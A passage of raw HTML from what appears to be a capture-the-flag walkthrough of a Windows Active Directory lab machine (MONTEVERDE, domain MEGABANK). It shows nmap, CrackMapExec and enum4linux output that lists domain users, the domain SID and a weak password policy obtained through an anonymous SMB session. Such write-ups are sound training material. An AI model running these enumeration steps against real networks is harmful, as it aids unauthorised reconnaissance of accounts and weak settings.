</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span class=line><span class=cl>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl>|_http-title: Not Found
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49674/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49675/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49703/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49775/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r
</span></span><span class=line><span class=cl>SF:(DNSVersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
</span></span><span class=line><span class=cl>SF:sion\x04bind\0\0\x10\0\x03&#34;);
</span></span><span class=line><span class=cl>Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_clock-skew: -48m05s
</span></span><span class=line><span class=cl>| smb2-security-mode:
</span></span><span class=line><span class=cl>|   2.02:
</span></span><span class=line><span class=cl>|_    Message signing enabled and required
</span></span><span class=line><span class=cl>| smb2-time:
</span></span><span class=line><span class=cl>|   date: 2020-03-25T20:22:50
</span></span><span class=line><span class=cl>|_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 275.27 seconds
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see what we can find through SMB with <a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>, <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a>
and <code>GetNPUsers.py</code> from impacket.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>cme</span> <span class=n>smb</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl><span class=n>SMB</span>         <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=mi>445</span>    <span class=n>MONTEVERDE</span>       <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Windows</span> <span class=mf>10.0</span> <span class=n>Build</span> <span class=mi>17763</span> <span class=n>x64</span> <span class=p>(</span><span class=n>name</span><span class=p>:</span><span class=n>MONTEVERDE</span><span class=p>)</span> <span class=p>(</span><span class=n>domain</span><span class=p>:</span><span class=n>MEGABANK</span><span class=p>)</span> <span class=p>(</span><span class=n>signing</span><span class=p>:</span><span class=n>True</span><span class=p>)</span> <span class=p>(</span><span class=n>SMBv1</span><span class=p>:</span><span class=n>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>enum4linux</span> <span class=o>-</span><span class=n>a</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl><span class=n>Starting</span> <span class=n>enum4linux</span> <span class=n>v0</span><span class=o>.</span><span class=mf>8.9</span> <span class=p>(</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>labs</span><span class=o>.</span><span class=n>portcullis</span><span class=o>.</span><span class=n>co</span><span class=o>.</span><span class=n>uk</span><span class=o>/</span><span class=n>application</span><span class=o>/</span><span class=n>enum4linux</span><span class=o>/</span> <span class=p>)</span> <span class=n>on</span> <span class=n>Wed</span> <span class=n>Mar</span> <span class=mi>25</span> <span class=mi>22</span><span class=p>:</span><span class=mi>30</span><span class=p>:</span><span class=mi>29</span> <span class=mi>2020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>==========================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Target</span> <span class=n>Information</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>==========================</span>
</span></span><span class=line><span class=cl><span class=n>Target</span> <span class=o>...........</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl><span class=ne>RID</span> <span class=ne>Range</span> <span class=o>........</span> <span class=mi>500</span><span class=o>-</span><span class=mi>550</span><span class=p>,</span><span class=mi>1000</span><span class=o>-</span><span class=mi>1050</span>
</span></span><span class=line><span class=cl><span class=n>Username</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>Password</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>Known</span> <span class=n>Usernames</span> <span class=o>..</span> <span class=n>administrator</span><span class=p>,</span> <span class=n>guest</span><span class=p>,</span> <span class=n>krbtgt</span><span class=p>,</span> <span class=n>domain</span> <span class=n>admins</span><span class=p>,</span> <span class=n>root</span><span class=p>,</span> <span class=n>bin</span><span class=p>,</span> <span class=n>none</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Enumerating</span> <span class=n>Workgroup</span><span class=o>/</span><span class=n>Domain</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Can</span><span class=s1>&#39;t find workgroup/domain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>============================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Nbtstat</span> <span class=n>Information</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>============================================</span>
</span></span><span class=line><span class=cl><span class=n>Looking</span> <span class=n>up</span> <span class=n>status</span> <span class=n>of</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>reply</span> <span class=n>from</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>=====================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Session</span> <span class=n>Check</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>=====================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Server</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>allows</span> <span class=n>sessions</span> <span class=n>using</span> <span class=n>username</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>password</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Got</span> <span class=n>domain</span><span class=o>/</span><span class=n>workgroup</span> <span class=n>name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>===========================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Getting</span> <span class=n>domain</span> <span class=n>SID</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>===========================================</span>
</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>initialize</span> <span class=n>messaging</span> <span class=n>context</span>
</span></span><span class=line><span class=cl><span class=n>Domain</span> <span class=n>Name</span><span class=p>:</span> <span class=n>MEGABANK</span>
</span></span><span class=line><span class=cl><span class=n>Domain</span> <span class=n>Sid</span><span class=p>:</span> <span class=n>S</span><span class=o>-</span><span class=mi>1</span><span class=o>-</span><span class=mi>5</span><span class=o>-</span><span class=mi>21</span><span class=o>-</span><span class=mi>391775091</span><span class=o>-</span><span class=mi>850290835</span><span class=o>-</span><span class=mi>3566037492</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Host</span> <span class=n>is</span> <span class=n>part</span> <span class=n>of</span> <span class=n>a</span> <span class=n>domain</span> <span class=p>(</span><span class=ow>not</span> <span class=n>a</span> <span class=n>workgroup</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>======================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=ne>OS</span> <span class=n>information</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>======================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Got</span> <span class=ne>OS</span> <span class=n>info</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>from</span> <span class=n>smbclient</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Got</span> <span class=ne>OS</span> <span class=n>info</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>from</span> <span class=n>srvinfo</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>initialize</span> <span class=n>messaging</span> <span class=n>context</span>
</span></span><span class=line><span class=cl><span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>srvsvc</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_ACCESS_DENIED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>=============================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Users</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>=============================</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfb6</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x450</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>AAD_987d7f2f57d2</span>       <span class=n>Name</span><span class=p>:</span> <span class=n>AAD_987d7f2f57d2</span>  <span class=n>Desc</span><span class=p>:</span> <span class=n>Service</span> <span class=n>account</span> <span class=k>for</span> <span class=n>the</span> <span class=n>Synchronization</span> <span class=n>Service</span> <span class=n>with</span> <span class=n>installation</span> <span class=n>identifier</span> <span class=mi>05</span><span class=n>c97990</span><span class=o>-</span><span class=mi>7587</span><span class=o>-</span><span class=mi>4</span><span class=n>a3d</span><span class=o>-</span><span class=n>b312</span><span class=o>-</span><span class=mi>309</span><span class=n>adfc172d9</span> <span class=n>running</span> <span class=n>on</span> <span class=n>computer</span> <span class=n>MONTEVERDE</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfd0</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa35</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>dgalanos</span>       <span class=n>Name</span><span class=p>:</span> <span class=n>Dimitris</span> <span class=n>Galanos</span>  <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xedb</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x1f5</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000215</span> <span class=n>Account</span><span class=p>:</span> <span class=n>Guest</span>  <span class=n>Name</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>    <span class=n>Desc</span><span class=p>:</span> <span class=n>Built</span><span class=o>-</span><span class=ow>in</span> <span class=n>account</span> <span class=k>for</span> <span class=n>guest</span> <span class=n>access</span> <span class=n>to</span> <span class=n>the</span> <span class=n>computer</span><span class=o>/</span><span class=n>domain</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfc3</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x641</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>mhope</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Mike</span> <span class=n>Hope</span> <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfd1</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa36</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>roleary</span>        <span class=n>Name</span><span class=p>:</span> <span class=n>Ray</span> <span class=n>O</span><span class=s1>&#39;Leary       Desc: (null)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfc5</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa2a</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SABatchJobs</span>    <span class=n>Name</span><span class=p>:</span> <span class=n>SABatchJobs</span>       <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfd2</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa37</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>smorgan</span>        <span class=n>Name</span><span class=p>:</span> <span class=n>Sally</span> <span class=n>Morgan</span>      <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfc6</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa2b</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>ata</span>        <span class=n>Name</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>ata</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfc7</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa2c</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>bexec</span>      <span class=n>Name</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>bexec</span> <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfc8</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0xa2d</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>netapp</span>     <span class=n>Name</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>netapp</span>        <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>Guest</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f5</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>AAD_987d7f2f57d2</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x450</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>mhope</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x641</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SABatchJobs</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2a</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc</span><span class=o>-</span><span class=n>ata</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2b</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc</span><span class=o>-</span><span class=n>bexec</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2c</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc</span><span class=o>-</span><span class=n>netapp</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa2d</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>dgalanos</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa35</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>roleary</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa36</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>smorgan</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0xa37</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>=========================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Share</span> <span class=n>Enumeration</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>=========================================</span>
</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>initialize</span> <span class=n>messaging</span> <span class=n>context</span>
</span></span><span class=line><span class=cl><span class=n>do_connect</span><span class=p>:</span> <span class=n>Connection</span> <span class=n>to</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>failed</span> <span class=p>(</span><span class=n>Error</span> <span class=n>NT_STATUS_RESOURCE_NAME_NOT_FOUND</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>Sharename</span>       <span class=n>Type</span>      <span class=n>Comment</span>
</span></span><span class=line><span class=cl>        <span class=o>---------</span>       <span class=o>----</span>      <span class=o>-------</span>
</span></span><span class=line><span class=cl><span class=n>Reconnecting</span> <span class=n>with</span> <span class=n>SMB1</span> <span class=k>for</span> <span class=n>workgroup</span> <span class=n>listing</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Unable</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>with</span> <span class=n>SMB1</span> <span class=o>--</span> <span class=n>no</span> <span class=n>workgroup</span> <span class=n>available</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Attempting</span> <span class=n>to</span> <span class=n>map</span> <span class=n>shares</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Password</span> <span class=n>Policy</span> <span class=n>Information</span> <span class=k>for</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>====================================================</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Unexpected</span> <span class=n>error</span> <span class=n>from</span> <span class=n>polenum</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Attaching</span> <span class=n>to</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span> <span class=n>using</span> <span class=n>a</span> <span class=n>NULL</span> <span class=n>share</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Trying</span> <span class=n>protocol</span> <span class=mi>139</span><span class=o>/</span><span class=n>SMB</span><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Protocol</span> <span class=n>failed</span><span class=p>:</span> <span class=n>Cannot</span> <span class=n>request</span> <span class=n>session</span> <span class=p>(</span><span class=n>Called</span> <span class=n>Name</span><span class=p>:</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Trying</span> <span class=n>protocol</span> <span class=mi>445</span><span class=o>/</span><span class=n>SMB</span><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=n>Protocol</span> <span class=n>failed</span><span class=p>:</span> <span class=n>Missing</span> <span class=n>required</span> <span class=n>parameter</span> <span class=s1>&#39;digestmod&#39;</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Retieved</span> <span class=n>partial</span> <span class=n>password</span> <span class=n>policy</span> <span class=n>with</span> <span class=n>rpcclient</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Password</span> <span class=n>Complexity</span><span class=p>:</span> <span class=n>Disabled</span>
</span></span><span class=line><span class=cl><span class=n>Minimum</span> <span class=n>Password</span> <span class=n>Length</span><span class=p>:</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>==============================</span>
</span></span><span class=line><span class=cl><span class=o>|</span>    <span class=n>Groups</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.172</span>    <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=o>==============================</span>
</span></span><span class=line><span class=cl>
